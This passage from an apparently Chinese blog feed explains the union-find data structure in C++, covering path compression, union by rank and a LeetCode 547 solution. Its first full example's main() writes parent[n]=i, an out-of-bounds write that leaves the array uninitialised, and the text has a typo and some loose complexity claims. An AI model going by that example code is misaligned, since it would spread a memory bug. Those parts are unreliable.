node2,vector&amp;lt;int&amp;gt;&amp;amp; parent)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int root1=find(node1,parent);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int root2=find(node2,parent);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(root1==root2)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //两个元素属于同一顶点，已连通，无需作处理&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //两个元素不属于同一顶点，那么其中一个顶点的前驱节点变为另一个前驱节点。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //一般情况下parent[root1]=root2和parent[root2]=root1没有太大区别，但是&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //有些情况可能只能parent[root1]=root2或parent[root2]=root1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    parent[root1]=root2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;connect 复杂度和 find 一样。因为调用了 2 次 find。&lt;/p&gt;
&lt;h3 id=&#34;24-完整代码及举例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#24-完整代码及举例&#34;&gt;#&lt;/a&gt; 2.4 完整代码及举例：&lt;/h3&gt;
&lt;p&gt;举一个简单的例子，参照下题：&lt;br&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; 给定n和vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; array,n代表有n个顶点，array每个元素均是长度为2的数组，&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;代表array[i][0]与array[1]连通。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如下：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3，&amp;#123;&amp;#123;1，2&amp;#125;，&amp;#123;0，1&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;代表3个顶点，1和2连通，0和1连通&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;构造完整并查集如下：&lt;br&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include&amp;lt;vector&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//这里省去n和array的初始化，如果是标准输入需要在主函数进行多组输入操作。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//如果是力扣的模式就无需这一步&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; array;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int find(int&amp;amp; node,vector&amp;lt;int&amp;gt;&amp;amp; parent)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int q=node;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while(parent[q]!=q)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        q=parent[q];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return q;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void connect(int&amp;amp; node1,int&amp;amp; node2,vector&amp;lt;int&amp;gt;&amp;amp; parent)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int root1=find(node1,parent);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int root2=find(node2,parent);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(root1==root2)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //两个元素属于同一顶点，已连通，无需作处理&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //两个元素不属于同一顶点，那么其中一个顶点的前驱节点变为另一个前驱节点。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //一般情况下parent[root1]=root2和parent[root2]=root1没有太大区别，但是&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //有些情况可能只能parent[root1]=root2或parent[root2]=root1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    parent[root1]=root2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    vector&amp;lt;int&amp;gt; parent(n,0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for(int i=0;i&amp;lt;n;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //用自己初始化parent&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        parent[n]=i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for(int i=0;i&amp;lt;n;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        connect(array[i][0],array[i][1],parent);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //构建完并查集的其它操作，如判断是不是同一个集合或者求集合数等等&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这种方式可以构建并查集。我们也可以构建一个类，让 parent 作成员变量，这样 find 和 connect 就不需要最后一个参数了。&lt;/p&gt;
&lt;p&gt;这种方式复杂度比较高，每次 connect 都需要平均 O (logN) 的复杂度。我们可以尝试优化 connect 的效率。&lt;/p&gt;
&lt;h2 id=&#34;3优化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3优化&#34;&gt;#&lt;/a&gt; 3. 优化：&lt;/h2&gt;
&lt;p&gt;优化一般有两种方式，路径压缩和按秩合并。&lt;/p&gt;
&lt;h3 id=&#34;31-路径压缩&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#31-路径压缩&#34;&gt;#&lt;/a&gt; 3.1 路径压缩：&lt;/h3&gt;
&lt;p&gt;路径压缩是压缩 find 函数的时间，它的核心思想是在寻找根节点后递归的把所有中间节点的前驱节点改为根节点，代码如下：&lt;br&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int find(int&amp;amp; node,vector&amp;lt;int&amp;gt;&amp;amp; parent)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(parent[node]!=node)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        parent[node]=find(parent[node],parent);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return parent[node];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这种方式可以一定程度压缩 find 函数，使得第二次查找起复杂度均为 1，直到根节点下次更新。不过第一次的复杂度还是 n。&lt;/p&gt;
&lt;p&gt;单独使用路径压缩算法，每次 connect 的平均时间复杂度为 O (α(n))，最坏为 O (logN)。&lt;/p&gt;
&lt;p&gt;α(n) 为阿克曼函数的反函数，基本可以认为是常数，即便 n 取已知宇宙中包含的原子总数，α(n) 也不会超过 5，因此 α(n) 复杂度基本可以认为是 O (1)。&lt;/p&gt;
&lt;h3 id=&#34;32-按秩合并&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#32-按秩合并&#34;&gt;#&lt;/a&gt; 3.2 按秩合并:&lt;/h3&gt;
&lt;p&gt;按秩合并主要处理 connect 函数。它的原理是先建立一个 parentSize 数组，parentSize [i] 表示以 i 为顶点的树的节点数或高度。我习惯使用高度。&lt;/p&gt;
&lt;p&gt;代码如下：&lt;br&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;void connect(int&amp;amp; node1,int&amp;amp; node2,vector&amp;lt;int&amp;gt;&amp;amp; parent,vector&amp;lt;int&amp;gt;&amp;amp; parentSize)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int root1=find(node1,parent);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int root2=find(node2,parent);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(root1==root2)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //两个元素属于同一顶点，已连通，无需作处理&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //两个元素不属于同一顶点，将高度低的根节点指向为高度高的&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(parentSize[root1]&amp;lt;parentSize[root2])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        parent[root1]=root2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        parentSize[root2]=max(parentSize[root2],parentSize[root1]+1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    parent[root2]=root1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    parentSize[root1]=max(parentSize[root1],parentSize[root2]+1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;单独这种方式最坏复杂度和平均复杂度均为 O (logN).&lt;/p&gt;
&lt;h3 id=&#34;33-按秩合并和路径压缩结合&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#33-按秩合并和路径压缩结合&#34;&gt;#&lt;/a&gt; 3.3 按秩合并和路径压缩结合&lt;/h3&gt;
&lt;p&gt;我们可以在两个函数分别使用路径压缩和按秩合并，联合使用的最好和最坏复杂度均为 O (α(n))。&lt;/p&gt;
&lt;h2 id=&#34;4例题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4例题&#34;&gt;#&lt;/a&gt; 4. 例题：&lt;/h2&gt;
&lt;p&gt;在力扣中我找到的最适合并查集的是第 547 题：力扣&lt;/p&gt;
&lt;p&gt;这道题其实不能完全体现并查集的优势，因为使用 DFS/BFS 的复杂度是 n&lt;sup&gt;2，而并查集的复杂度是 α(n)*n&lt;/sup&gt;2。如果将题目改为给出任意两点判断是否连通并查集优势就体现出来了。&lt;/p&gt;
&lt;p&gt;解题代码如下：&lt;br&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;class Solution &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int find(int&amp;amp; num,vector&amp;lt;int&amp;gt;&amp;amp; father)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if(father[num]!=num)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            father[num]=find(father[num],father);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return father[num];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void connect(int&amp;amp; num1,int&amp;amp; num2,vector&amp;lt;int&amp;gt;&amp;amp; father,vector&amp;lt;int&amp;gt;&amp;amp; fatherSize)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int root1=find(num1,father);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int root2=find(num2,father);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if(root1==root2)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if(fatherSize[root1]&amp;lt;fatherSize[root2])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            father[root1]=root2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            fatherSize[root2]=max(fatherSize[root2],fatherSize[root1]+1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        father[root2]=root1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        fatherSize[root1]=max(fatherSize[root1],fatherSize[root2]+1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int findCircleNum(vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt;&amp;amp; isConnected) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int len=isConnected.size();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        vector&amp;lt;int&amp;gt; father(len);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        vector&amp;lt;int&amp;gt; fatherSize(len,1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int i(0),j(0),t(0),n(len);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for(i=0;i&amp;lt;len;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            father[i]=i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for(i=0;i&amp;lt;len;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            for(j=i+1;j&amp;lt;len;j++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                if(isConnected[i][j])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    connect(i,j,father,fatherSize);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for(i=0;i&amp;lt;len;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            if(father[i]!=i)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                n-=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
</content>
        <updated>2023-01-11T16:44:42.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/CPP%E7%BB%93%E6%9E%84%E4%BD%93/</id>
        <title>CPP结构体</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/CPP%E7%BB%93%E6%9E%84%E4%BD%93/"/>
        <content type="html">&lt;h1 id=&#34;c-结构体struct&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#c-结构体struct&#34;&gt;#&lt;/a&gt; C++ 结构体（struct）&lt;/h1&gt;
&lt;h2 id=&#34;一-定义与声明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-定义与声明&#34;&gt;#&lt;/a&gt; 一、定义与声明&lt;/h2&gt;
